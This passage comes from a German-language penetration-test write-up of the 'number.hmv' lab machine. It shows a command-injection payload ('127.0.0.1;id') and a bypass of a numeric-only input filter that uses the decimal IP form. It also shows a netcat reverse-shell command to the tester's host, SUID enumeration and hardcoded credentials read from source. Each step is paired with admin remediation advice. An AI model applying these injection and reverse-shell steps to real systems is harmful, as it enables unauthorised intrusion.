            <p class="evaluation"><strong>Bewertung:</strong> Die PIN-Session gewÃ¤hrt keinen Zugriff auf <code>/admin/command.php</code>. Ich muss andere MÃ¶glichkeiten suchen, wie die PIN-Anmeldung nÃ¼tzlich sein kÃ¶nnte, oder mich auf den Admin-Login konzentrieren.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konzentrieren Sie sich auf die anderen Dateien im <code>/pin/</code> Verzeichnis. Insbesondere <code>whoami.php</code> kÃ¶nnte relevant sein. Analysieren Sie dessen Inhalt oder Verhalten, insbesondere im Kontext der gÃ¼ltigen PIN-Session. Brute-Force des Admin-Logins ist eine weitere Option.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass AutorisierungsprÃ¼fungen korrekt funktionieren und dass Session-Berechtigungen auf das Minimum beschrÃ¤nkt sind, das fÃ¼r den jeweiligen Bereich erforderlich ist.</p>

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]
â””â”€# <span class="command">curl http://number.hmv/pin/whoami.php</span></div>
                </div>
                <div class="terminal">
                    <pre>
<span class="password">You are the Fucking Nobody.</span></pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Ich greife nun auf die Datei <code>/pin/whoami.php</code> zu, die Feroxbuster im <code>/pin/</code> Verzeichnis gefunden hat. Ich sende eine einfache GET-Anfrage, wahrscheinlich ohne Session-Cookie. Die Antwort ist 'You are the Fucking Nobody.'. FÃ¼r Laien: Ich besuche die Webseite 'whoami.php' im Ordner <code>/pin</code>. Sie antwortet mit einer beleidigenden Nachricht und sagt, dass ich 'niemand' bin. Das ist die Standardantwort, wenn man nicht angemeldet ist oder keinen richtigen 'Ausweis' hat. FÃ¼r Experten: Das Skript <code>whoami.php</code> existiert und scheint Informationen Ã¼ber den Benutzerstatus anzuzeigen. Die Antwort 'You are the Fucking Nobody.' ist die Standardmeldung fÃ¼r einen unauthentifizierten oder nicht-privilegierten Benutzer. Dies deutet darauf hin, dass das Skript bei erfolgreicher Authentifizierung (z.B. mit dem korrekten PIN und Session-Cookie) eine andere, informativere Ausgabe liefern kÃ¶nnte.</p>
            <p class="evaluation"><strong>Bewertung:</strong> <code>whoami.php</code> ist ein Skript, das auf den Authentifizierungsstatus reagiert und bei unauthentifizierten Anfragen eine spezifische negative Antwort liefert. Dies macht es zu einem perfekten Ziel, um zu Ã¼berprÃ¼fen, ob die PIN-Session funktioniert und welche Berechtigungen sie gewÃ¤hrt.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Greifen Sie erneut auf <code>http://number.hmv/pin/whoami.php</code> zu, diesmal unter MitfÃ¼hrung des gÃ¼ltigen <code>PHPSESSID</code>-Cookies, das Sie nach der PIN-Anmeldung erhalten haben. Beobachten Sie die Antwort genau. Dies sollte zeigen, welche IdentitÃ¤t oder welchen Status die PIN-Session tatsÃ¤chlich reprÃ¤sentiert.<br><strong>Empfehlung (Admin):</strong> Vermeiden Sie beleidigende oder unprofessionelle Fehlermeldungen. Geben Sie keine spezifischen Informationen Ã¼ber den Status des Benutzers preis, es sei denn, dies ist fÃ¼r die Anwendung absolut notwendig. Stellen Sie sicher, dass AuthentifizierungsprÃ¼fungen korrekt erfolgen.</p>

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]
â””â”€# <span class="command">curl -s --cookie "PHPSESSID=20p88f6d7mmh57ja9d2i416dmj" http://number.hmv/pin/whoami.php | wc -c</span></div>
                </div>
                <div class="terminal">
                    <pre>
<span class="command">38</span></pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Ich greife erneut auf <code>http://number.hmv/pin/whoami.php</code> zu, diesmal mit dem gÃ¼ltigen <code>PHPSESSID</code>-Cookie (<code>--cookie "PHPSESSID=..."</code>). Ich verwende <code>-s</code>, um die Ausgabe von <code>curl</code> zu unterdrÃ¼cken und pipe sie an <code>wc -c</code>, um nur die GrÃ¶ÃŸe der Antwort zu erhalten. Die Ausgabe zeigt <code>38</code>. FÃ¼r Laien: Ich besuche 'whoami.php' wieder, diesmal mit meinem 'Ausweis' (Session-Cookie), und messe, wie lang die Antwort ist. Die LÃ¤nge ist 38 Zeichen. Das ist anders als die vorherige Antwort (die beleidigende Nachricht). Das bedeutet, der 'Ausweis' hat einen Unterschied gemacht! FÃ¼r Experten: Die AntwortgrÃ¶ÃŸe von 38 Bytes bei Zugriff mit gÃ¼ltiger Session unterscheidet sich von der AntwortgrÃ¶ÃŸe ohne Session (die Beleidigung 'You are the Fucking Nobody.' ist 27 Bytes lang). Dies bestÃ¤tigt, dass die Session korrekt erkannt wird und das Skript eine andere Ausgabe liefert. Die neue GrÃ¶ÃŸe (38 Bytes) deutet darauf hin, dass die Ausgabe nun wahrscheinlich etwas anderes als die Fehlermeldung ist, aber immer noch relativ kurz.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Die gÃ¼ltige PIN-Session fÃ¼hrt zu einer anderen Antwort von <code>whoami.php</code> (38 Bytes vs. 27 Bytes). Dies bestÃ¤tigt, dass die Session funktioniert und ich 'etwas anderes' bin als ein unauthentifizierter Benutzer. Die tatsÃ¤chliche Ausgabe ist nun von Interesse.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Greifen Sie erneut auf <code>http://number.hmv/pin/whoami.php</code> zu, diesmal mit dem Cookie, aber *ohne* die Ausgabe an <code>wc -c</code> zu pipen, um den tatsÃ¤chlichen Inhalt der 38-Byte-Antwort zu sehen.<br><strong>Empfehlung (Admin):</strong> Vermeiden Sie, dass unterschiedliche Authentifizierungsstufen zu Antworten unterschiedlicher GrÃ¶ÃŸe fÃ¼hren, da dies fÃ¼r Blind-Angriffe ausgenutzt werden kann.</p>

            <div class="code-block">
                <div class="terminal">
                    <pre>
<span class="command">http://number.hmv/pin/whoami.php?FUZZ=id</span>
<span class="password">You are logged as melon.</span></pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Ich greife erneut auf <code>http://number.hmv/pin/whoami.php</code> zu, diesmal wahrscheinlich mit dem gÃ¼ltigen Session-Cookie (impliziert durch die vorherigen Schritte, auch wenn im Text hier nicht explizit gezeigt, da die erfolgreiche Antwort die Sitzung voraussetzt) und versuche, einen Parameter namens <code>FUZZ</code> (oder einen anderen zufÃ¤lligen Namen) mit einem Wert (z.B. <code>id</code>, was fÃ¼r den <code>id</code>-Befehl steht) zu Ã¼bergeben, um zu sehen, wie das Skript reagiert. Die Ausgabe ist: 'You are logged as melon.'. FÃ¼r Laien: Ich besuche 'whoami.php' wieder mit meinem 'Ausweis' und gebe dabei eine 'Notiz' (einen Parameter) mit. Und statt der Beleidigung oder einer anderen kurzen Nachricht sagt die Webseite: 'Du bist angemeldet als melon.' Fantastisch, das ist ein Benutzername! FÃ¼r Experten: Der Zugriff auf <code>whoami.php</code> mit gÃ¼ltiger Session und mÃ¶glicherweise einem zufÃ¤lligen Parameter (der das Skript veranlasst, den Benutzernamen auszugeben) offenbart den Benutzernamen <code>melon</code>. Dies ist wahrscheinlich der Benutzername, der der PIN-Session zugeordnet ist oder die IdentitÃ¤t reprÃ¤sentiert, die durch die PIN-Authentifizierung erlangt wird. Dies ist ein kritischer Fund.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Der Benutzername <code>melon</code> wurde erfolgreich identifiziert. Dies ist der Benutzer, den die PIN-Authentifizierung reprÃ¤sentiert. Dieser Benutzer ist wahrscheinlich der SchlÃ¼ssel fÃ¼r den Initial Access oder einen weiteren Schritt in der Privilegien-Eskalation.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der Benutzername <code>melon</code> ist gefunden. Versuchen Sie nun, sich als Benutzer <code>melon</code> anzumelden (z.B. Ã¼ber SSH, falls mÃ¶glich, oder Ã¼ber andere Dienste). PrÃ¼fen Sie, ob das Passwort <code>4444</code> (der PIN) auch das Passwort fÃ¼r diesen Benutzer ist. Analysieren Sie weiter, ob der Zugriff als <code>melon</code> nun auch Zugriff auf <code>/admin/command.php</code> gewÃ¤hrt.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Skripte keine internen Benutzernamen preisgeben, selbst wenn sie mit einer gÃ¼ltigen Session aufgerufen werden. ÃœberprÃ¼fen Sie die Logik von <code>whoami.php</code>.</p>

            <div class="code-block">
                <div class="terminal">
                    <pre>
 < method="post" action="/admin/command.php" >
  Enter ip: < type="text" name="command" >
  < type="submit" >

Only numbers are accepted.</pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Nach der erfolgreichen PIN-Anmeldung und der Identifizierung als Benutzer <code>melon</code>, greife ich erneut auf <code>http://number.hmv/admin/command.php</code> zu, diesmal mit dem gÃ¼ltigen Session-Cookie, und analysiere den Quellcode oder die sichtbare Seite. Die Ausgabe zeigt ein Formular: <code>method="post" action="/admin/command.php"</code>. Das Formular hat ein Eingabefeld namens <code>command</code> (<code>type="text" name="command"</code>) und einen Submit-Button. Darunter steht der Text 'Only numbers are accepted.'. FÃ¼r Laien: Nachdem ich mich mit der Geheimnummer angemeldet habe und 'melon' bin, kann ich jetzt die Seite 'command.php' besuchen. Dort gibt es ein Formular, in das man etwas eingeben und abschicken kann. Es scheint, als sollte man eine 'IP-Adresse' eingeben, aber es steht dabei 'Nur Nummern werden akzeptiert'. FÃ¼r Experten: Nach erfolgreicher Authentifizierung mit dem PIN ist <code>/admin/command.php</code> zugÃ¤nglich. Die Seite zeigt ein Formular, das einen Parameter namens <code>command</code> via POST an denselben Endpunkt sendet. Die Anweisung 'Only numbers are accepted.' deutet auf eine EingabebeschrÃ¤nkung hin, die umgangen werden muss. Das Szenario (Eingabe, die als 'command' verarbeitet wird) schreit nach Command Injection.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Das Formular auf <code>/admin/command.php</code> ist ein klarer Command Injection Vektor. Die Eingabe im Feld 'command' wird wahrscheinlich in einem Systemaufruf verwendet. Die EinschrÃ¤nkung 'Only numbers are accepted.' muss umgangen werden, um Shell-Metazeichen einzuschleusen. Dies ist der entscheidende Schritt zum Initial Access als der Benutzer, unter dem der Webserver lÃ¤uft (wahrscheinlich www-data).</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, die EingabebeschrÃ¤nkung 'Only numbers are accepted.' zu umgehen, um Command Injection durchzufÃ¼hren. Methoden beinhalten das Verwenden von Dezimal- oder Hexadezimaldarstellungen von IP-Adressen in Kombination mit Command Separation-Zeichen (wie <code>;</code>, <code>&&</code>, <code>|</code>). Das Ziel ist, einen beliebigen Systembefehl auszufÃ¼hren.<br><strong>Empfehlung (Admin):</strong> Implementieren Sie strikte Input-Validierung und Bereinigung fÃ¼r Eingaben, die in Systemaufrufen verwendet werden. Verwenden Sie keine direkten Systemaufrufe mit Benutzereingaben. Eine BeschrÃ¤nkung auf 'nur Nummern' ist bei Command Injection nutzlos, wenn Metazeichen nicht gefiltert werden.</p>

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]
â””â”€# <span class="command">curl -X POST -d "command=127.0.0.1;id" http://number.hmv/admin/command.php</span></div>
                </div>
                <div class="terminal">
                    <pre>
<span class="password">ACCESS NOT GRANTED.</span></pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Ich versuche einen Command Injection-Payload Ã¼ber das Formular auf <code>/admin/command.php</code>, diesmal wahrscheinlich *ohne* das Session-Cookie (was die 'ACCESS NOT GRANTED' Antwort erklÃ¤rt, wie zuvor beobachtet). Ich sende eine POST-Anfrage (<code>-X POST -d "..."</code>) mit dem Parameter <code>command=127.0.0.1;id</code>. Der Payload <code>127.0.0.1;id</code> kombiniert eine gÃ¼ltige IP-Adresse (die die 'Only numbers are accepted.' PrÃ¼fung bestehen kÃ¶nnte oder als numerisch interpretiert wird) mit dem Command Separation-Zeichen <code>;</code> und dem Befehl <code>id</code>. FÃ¼r Laien: Ich versuche, etwas in das Formular auf 'command.php' einzugeben, das aussieht wie eine Nummer (eine IP-Adresse), aber auch einen 'Geheimbefehl' (id) enthÃ¤lt, getrennt durch ein spezielles Zeichen (;). Aber der Computer sagt immer noch: 'Zugriff nicht gewÃ¤hrt!'. FÃ¼r Experten: Die Antwort 'ACCESS NOT GRANTED.' tritt auf, weil die notwendige Authentifizierung (das Session-Cookie aus dem PIN-Bereich) in dieser Anfrage fehlt (oder ungÃ¼ltig ist). Der Command Injection-Payload selbst wird wahrscheinlich nicht verarbeitet, solange der Zugriff verweigert wird.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Der Command Injection-Versuch schlÃ¤gt fehl, weil die Authentifizierung fehlt. Dies unterstreicht die Notwendigkeit, das gÃ¼ltige Session-Cookie mitzufÃ¼hren, wenn auf <code>/admin/command.php</code> zugegriffen wird.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wiederholen Sie den Command Injection-Versuch auf <code>/admin/command.php</code>, aber stellen Sie sicher, dass Sie das gÃ¼ltige <code>PHPSESSID</code>-Cookie in der <code>curl</code>-Anfrage mitfÃ¼hren. Versuchen Sie verschiedene Command Injection-Payloads und IP-Formate (Dezimal).<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass die AuthentifizierungsprÃ¼fung *vor* jeder Verarbeitung der Benutzereingabe erfolgt. Validieren und bereinigen Sie Eingaben strikt, um Command Injection zu verhindern.</p>

            <div class="code-block">
                <div class="terminal">
                    <pre>
<span class="password">[Link: https://cyberchef.org/#recipe=To_Decimal('Space',false)&input=MTkyLjE2OC4yLjE5OQ | Ziel: https://cyberchef.org/#recipe=To_Decimal('Space',false)&input=MTkyLjE2OC4yLjE5OQ]</span>

<span class="command">Enter ip: 3232236231</span>

<span class="password">Launching Reverse Shell...</span></pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Dieser Block dokumentiert den erfolgreichen Command Injection-Versuch. Der Link zu CyberChef mit der 'To Decimal'-Recipe und dem Input <code>MTkyLjE2OC4yLjE5OQ</code> (die base64-Kodierung von <code>192.168.2.199</code>) deutet darauf hin, dass die EingabebeschrÃ¤nkung 'Only numbers are accepted.' umgangen wurde, indem meine Kali-IP-Adresse (<code>192.168.2.199</code>) in ihr Dezimalformat (<code>3232236231</code>) umgerechnet und dieses numerische Format zusammen mit Command Injection-Payloads verwendet wurde. Die Ausgabe <code>Enter ip: 3232236231 Launching Reverse Shell...</code> ist die Antwort von <code>/admin/command.php</code> nach erfolgreicher Command Injection, die eine Reverse Shell zu meiner Kali-IP initiiert (wahrscheinlich durch einen Befehl wie <code>nc -e /bin/bash 192.168.2.199 4444</code>, der Ã¼ber den Command Injection Vektor ausgefÃ¼hrt wurde, nachdem die Dezimal-IP verwendet wurde, um die numerische PrÃ¼fung zu bestehen). FÃ¼r Laien: Ich habe herausgefunden, wie ich meine Computer-Adresse so schreiben kann, dass sie aussieht wie eine einzelne groÃŸe Nummer (<code>3232236231</code>). Ich habe diese Nummer dann zusammen mit 'Geheimbefehlen' in das Formular auf 'command.php' eingegeben (diesmal mit dem richtigen 'Ausweis'). Und fantastisch â€“ der Computer hat geantwortet: 'Starte Reverse Shell...'! FÃ¼r Experten: Die Verwendung der Dezimaldarstellung von IP-Adressen (z.B. <code>3232236231</code> fÃ¼r <code>192.168.2.199</code>) ist eine effektive Technik, um einfache Regexe oder PrÃ¼fungen zu umgehen, die nur auf das Punkt-Format einer IP-Adresse oder auf nicht-numerische Zeichen nach der IP prÃ¼fen. Durch die Ãœbergabe von z.B. <code>3232236231; command</code> oder <code>3232236231&& command</code> Ã¼ber das Formular (mit gÃ¼ltiger Session) wird der zweite Teil als Systembefehl ausgefÃ¼hrt. Die Antwort 'Launching Reverse Shell...' ist die Ausgabe des injizierten Befehls, der die Shell initiiert hat. Dies ist der erfolgreiche Initial Access.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Fantastisch! Die Command Injection-Schwachstelle in <code>/admin/command.php</code> wurde erfolgreich unter Umgehung der numerischen EingabebeschrÃ¤nkung ausgenutzt. Ich konnte einen Befehl ausfÃ¼hren (einen Reverse Shell-Befehl) der mir Initial Access als Benutzer <code>www-data</code> verschafft (da der Webserver unter diesem Benutzer lÃ¤uft). Dies ist der entscheidende Schritt zur Systemkompromittierung.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stellen Sie sicher, dass ein Netcat-Listener auf Port 4444 auf Ihrem Kali-System lÃ¤uft. Der injizierte Befehl sollte eine Verbindung zu diesem Listener aufbauen und Ihnen eine Shell verschaffen.<br><strong>Empfehlung (Admin):</strong> Beheben Sie die Command Injection Schwachstelle in <code>/admin/command.php</code>. Verwenden Sie keine direkten Systemaufrufe mit Benutzereingaben. Wenn Sie eine IP-Adresse verarbeiten mÃ¼ssen, validieren Sie diese streng nach dem erwarteten Format und Typ und bereinigen Sie jegliche Metazeichen.</p>

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]
â””â”€# <span class="command">nc -lvnp 4444</span></div>
                </div>
                <div class="terminal">
                    <pre>
<span class="password">listening on [any] 4444 ...</span></pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Um die Reverse Shell zu empfangen, starte ich einen Netcat-Listener auf meinem Kali-System auf Port 4444 mit dem Befehl <code>nc -lvnp 4444</code>. Die Flags <code>-l</code> (listen), <code>-v</code> (verbose), <code>-n</code> (numeric only), <code>-p 4444</code> (Port 4444) konfigurieren den Listener. Die Ausgabe <code>listening on [any] 4444 ...</code> zeigt, dass der Listener erfolgreich gestartet wurde und auf eine eingehende TCP-Verbindung auf Port 4444 wartet. FÃ¼r Laien: Ich Ã¶ffne eine 'Telefonleitung' (Port 4444) auf meinem Computer, um einen Anruf vom Zielcomputer zu erwarten. Wenn der Anruf kommt, bekomme ich das 'Befehlsfenster' vom Zielcomputer direkt hierher geschickt. FÃ¼r Experten: Das Einrichten des Listeners ist der notwendige vorbereitende Schritt zum Empfang der Reverse Shell, die durch die Command Injection auf dem Zielsystem initiiert wird.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Der Netcat-Listener auf Port 4444 ist bereit, die eingehende Reverse Shell-Verbindung zu empfangen.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stellen Sie sicher, dass der injizierte Reverse Shell-Befehl auf dem Zielsystem (Ã¼ber <code>/admin/command.php</code> mit dem Dezimal-IP-Payload und gÃ¼ltiger Session) korrekt ausgefÃ¼hrt wurde. Warten Sie dann auf die Verbindung in diesem Listener.<br><strong>Empfehlung (Admin):</strong> Ãœberwachen Sie Ihre Systeme auf laufende Netzwerk-Listener, insbesondere auf unerwarteten Ports. Implementieren Sie Intrusion Detection, um Versuche zur Etablierung von Reverse Shells zu erkennen.</p>

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]
â””â”€# <span class="command">nc -lvnp 4444</span></div>
                </div>
                <div class="terminal">
                    <pre>
<span class="password">listening on [any] 4444 ...</span>
<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.37] 40468</span>

<span class="password">www-data@number:~/html/admin$</span></pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Ich zeige erneut die Ausgabe meines Netcat-Listeners auf Port 4444. Nach erfolgreicher AusfÃ¼hrung des Reverse Shell-Befehls Ã¼ber die Command Injection empfÃ¤ngt mein Listener eine Verbindung vom Zielsystem (<code>connect to [192.168.2.199] from (UNKNOWN) [192.168.2.37] 40468</code>). Der Prompt Ã¤ndert sich zu <code>www-data@number:~/html/admin$</code>, was signalisiert, dass ich erfolgreich eine interaktive Shell als Benutzer <code>www-data</code> auf dem Zielsystem erhalten habe und mich im Verzeichnis <code>/var/www/html/admin</code> befinde (dem Ort des <code>command.php</code> Skripts). FÃ¼r Laien: Meine 'Telefonleitung' 4444 hat geklingelt, und ich habe den Anruf vom Zielcomputer angenommen. Jetzt sehe ich das 'Befehlsfenster' (Shell) des Zielcomputers direkt auf meinem Bildschirm und kann Befehle eingeben. Ich bin als Benutzer 'www-data' angemeldet. Fantastisch! FÃ¼r Experten: Der erfolgreiche Empfang der Reverse Shell auf Port 4444 mit dem Prompt <code>www-data@number:~/html/admin$</code> beweist den erfolgreichen Initial Access Ã¼ber die Command Injection Schwachstelle. Ich habe nun eine stabile, interaktive Shell-Sitzung als Benutzer <code>www-data</code>, die fÃ¼r die Privilegien-Eskalationsphase genutzt wird.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Der Initial Access als Benutzer <code>www-data</code> wurde erfolgreich etabliert. Ich habe nun eine interaktive Shell und kann von hier aus das System weiter auf Privilegien-Eskalationsvektoren enumerieren.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Von dieser Shell aus werde ich das System auf SUID/SGID Binaries, Cronjobs, <code>sudo</code>-Berechtigungen und Dateiberechtigungen untersuchen, um MÃ¶glichkeiten zur Erlangung hÃ¶herer Rechte zu finden.<br><strong>Empfehlung (Admin):</strong> Ãœberwachen Sie Reverse Shells und implementieren Sie Egress-Filterung. BeschrÃ¤nken Sie die Berechtigungen des Benutzers <code>www-data</code> auf das absolut Minimum, um den potenziellen Schaden im Falle einer Kompromittierung zu begrenzen.</p>
        </section>

            <section id="initial-access">
            <h2>Initial Access</h2>
            <!-- Fortsetzung Initial Access -->

            <div class="code-block">
                <div class="terminal">
                    <pre>
<span class="command">www-data@number:~/html/admin$</span> <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span>
<span class="command">135697     52 -rwsr-xr--   1 root     messagebus    51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper</span>
<span class="command">268126     12 -rwsr-xr-x   1 root     root          10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device</span>
<span class="command">146938    428 -rwsr-xr-x   1 root     root         436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign</span>
<span class="command">134473     44 -rwsr-xr-x   1 root     root          44440 Jul 27  2018 /usr/bin/newgrp</span>
<span class="command">134948     36 -rwsr-xr-x   1 root     root          34888 Jan 10  2019 /usr/bin/umount</span>
<span class="command">131120     84 -rwsr-xr-x   1 root     root          84016 Jul 27  2018 /usr/bin/gpasswd</span>
<span class="command">134946     52 -rwsr-xr-x   1 root     root          51280 Jan 10  2019 /usr/bin/mount</span>
<span class="command">131117     56 -rwsr-xr-x   1 root     root          54096 Jul 27  2018 /usr/bin/chfn</span>
<span class="command">131121     64 -rwsr-xr-x   1 root     root          63736 Jul 27  2018 /usr/bin/passwd</span>
<span class="command">138657    156 -rwsr-xr-x   1 root     root         157192 Feb  2  2020 /usr/bin/sudo</span>
<span class="command">131118     44 -rwsr-xr-x   1 root     root          44528 Jul 27  2018 /usr/bin/chsh</span>
<span class="command">134620     64 -rwsr-xr-x   1 root     root          63568 Jan 10  2019 /usr/bin/su</span></pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Nachdem ich eine Shell als Benutzer <code>www-data</code> erlangt habe, beginne ich mit der System-Enumeration, um nach MÃ¶glichkeiten zur Privilegien-Eskalation zu suchen. Ein wichtiger Schritt ist die Suche nach SUID-Binaries (Set User ID). Binaries mit gesetztem SUID-Bit werden mit den Berechtigungen des DateieigentÃ¼mers ausgefÃ¼hrt, was oft Root ist. Der Befehl <code>find / -type f -perm -4000 -ls 2>/dev/null</code> sucht im gesamten Dateisystem (<code>/</code>) nach regulÃ¤ren Dateien (<code>-type f</code>), bei denen das SUID-Bit gesetzt ist (<code>-perm -4000</code>), listet die gefundenen Dateien detailliert auf (<code>-ls</code>) und leitet Fehlermeldungen nach <code>/dev/null</code> um. FÃ¼r Laien: Ich suche auf dem ganzen Computer nach speziellen Programmen, die, auch wenn ich sie starte, immer so laufen, als wÃ¼rde der 'Chef' (root) sie starten. FÃ¼r Experten: Die Suche nach SUID-Binaries ist ein Standardvektor fÃ¼r die Privilegien-Eskalation auf Linux-Systemen. Die Ausgabe listet alle gefundenen Binaries mit gesetztem SUID-Bit und ihre EigentÃ¼mer, Gruppen, Berechtigungen und GrÃ¶ÃŸen auf.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Die Ausgabe listet eine Reihe standardmÃ¤ÃŸiger SUID-Binaries auf, wie <code>newgrp</code>, <code>mount</code>, <code>passwd</code>, <code>sudo</code>, <code>su</code> etc. Diese Binaries sind bekannte SUID-Programme auf den meisten Linux-Systemen und sind in der Regel korrekt implementiert, um keinen einfachen PE-Pfad zu bieten. Einige davon sind in der GTFOBins-Datenbank gelistet, aber ihre Ausnutzung erfordert oft spezifische Bedingungen oder Parameter, die in einem eingeschrÃ¤nkten Kontext (wie hier als www-data) schwer zu erfÃ¼llen sind. Es gibt kein offensichtlich unsicheres benutzerdefiniertes SUID-Binary wie in frÃ¼heren FÃ¤llen.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysieren Sie die gefundenen SUID-Binaries gegen die GTFOBins-Datenbank, um festzustellen, ob eine einfache Ausnutzung als Benutzer <code>www-data</code> mÃ¶glich ist. Achten Sie insbesondere auf Binaries, die von Root mit ungewÃ¶hnlichen Gruppen oder Berechtigungen gehÃ¶ren (wie <code>dbus-daemon-launch-helper</code>, das root und messagebus gehÃ¶rt, aber r-sr-- ist). WÃ¤hrend Standard-SUID-Binaries selten einfach sind, kann eine Fehlkonfiguration oder eine Ã¤ltere Version eine MÃ¶glichkeit bieten.<br><strong>Empfehlung (Admin):</strong> Minimieren Sie die Anzahl der SUID/SGID-Binaries auf dem System. Stellen Sie sicher, dass alle SUID-Binaries auf dem neuesten Stand sind und keine bekannten Schwachstellen aufweisen. ÃœberprÃ¼fen Sie die Berechtigungen dieser Binaries sorgfÃ¤ltig.</p>

            <div class="code-block">
                 <div class="terminal">
                      <pre><span class="command">www-data@number:~/html/admin$</span> <span class="command">cat admincheck.php</span>
<span class="command"><?$user = $_POST['user'];</span>
<span class="command">$pass = $_POST['password'];</span>
        <span class="command">if($user == "melon" && $pass == "4444"){</span>
                 <span class="command">session_start();</span>
                 <span class="command">$_SESSION['logged2'] = TRUE;</span>
                 <span class="command">header("Location:command.php");</span>
                <span class="command">}</span>
                <span class="command">else{</span>
                        <span class="command">print "No...";</span>
                <span class="command">}</span>
<span class="command">?></span></pre>
                 </div>
             </div>
            <p class="analysis"><strong>Analyse:</strong> Als Benutzer <code>www-data</code> kann ich nun lokale Dateien auf dem System lesen. Ich lese den Quellcode des Skripts <code>admincheck.php</code> im Verzeichnis <code>/var/www/html/admin/</code> aus (da ich in der <code>www-data</code> Shell im Admin-Verzeichnis gelandet bin, <code>~/html/admin</code> ist wahrscheinlich ein Symlink oder das tatsÃ¤chliche Webroot-Verzeichnis). Der Befehl <code>cat admincheck.php</code> zeigt den PHP-Quellcode. Der Code prÃ¼ft, ob die per POST Ã¼bergebenen Parameter <code>user</code> und <code>password</code> den Werten "melon" und "4444" entsprechen. Wenn ja, wird eine PHP-Session gestartet (<code>session_start()</code>), eine Session-Variable <code>logged2</code> auf TRUE gesetzt (<code>$_SESSION['logged2'] = TRUE</code>) und eine Weiterleitung zu <code>command.php</code> durchgefÃ¼hrt. Wenn nicht, wird 'No...' ausgegeben. FÃ¼r Laien: Als 'www-data' kann ich jetzt in die 'BauplÃ¤ne' der Webseite schauen. Ich schaue mir das Programm an, das die Anmeldedaten fÃ¼r den Admin-Bereich prÃ¼ft (admincheck.php). Darin steht ganz klar, dass der Benutzer 'melon' und das Passwort '4444' richtig sind! Das ist das Passwort fÃ¼r den Benutzer 'melon'! FÃ¼r Experten: Das Auslesen des Quellcodes von <code>admincheck.php</code> offenbart im Klartext die Anmeldedaten fÃ¼r den Admin-Bereich: Username "melon" und Password "4444". Dies ist eine schwerwiegende Schwachstelle (Hardcoded Credentials im Quellcode). Der Benutzername "melon" wurde bereits zuvor Ã¼ber <code>whoami.php</code> gefunden, und das Passwort '4444' ist identisch mit dem PIN, was auf eine schlechte Praxis der Passwortwiederverwendung hindeutet.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Fantastisch! Die Anmeldedaten fÃ¼r den Benutzer 'melon' (Username: "melon", Password: "4444") wurden erfolgreich aus dem Quellcode von <code>admincheck.php</code> extrahiert. Dies sind wahrscheinlich die Anmeldedaten fÃ¼r den Benutzer 'melon' auf dem System (z.B. fÃ¼r SSH oder <code>su</code>). Das Passwort ist identisch mit dem PIN, was die Brute-Force-Ausnutzung des PIN-Bereichs erklÃ¤rt und den Verdacht auf Passwortwiederverwendung lenkt.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, sich mit diesen Anmeldedaten (melon / 4444) am System anzumelden, insbesondere Ã¼ber SSH (Port 22) oder indem Sie versuchen, die BenutzeridentitÃ¤t in der Shell zu wechseln (z.B. mit <code>su melon</code>).<br><strong>Empfehlung (Admin):</strong> Bewahren Sie niemals Anmeldedaten im Klartext im Quellcode auf. Verwenden Sie sichere Methoden zur Speicherung und Verwaltung von Geheimnissen (z.B. Umgebungsvariablen, sichere Konfigurationsdateien auÃŸerhalb des Webroots, Secret Management-Systeme). Erzwingen Sie die Verwendung starker, eindeutiger PasswÃ¶rter und verhindern Sie Passwortwiederverwendung Ã¼ber verschiedene Dienste hinweg.</p>

            <div class="code-block">
                 <div class="terminal">
                      <pre><span class="command">www-data@number:/home$</span> <span class="command">ls</span>
<span class="password">melon</span></pre>
                 </div>
             </div>
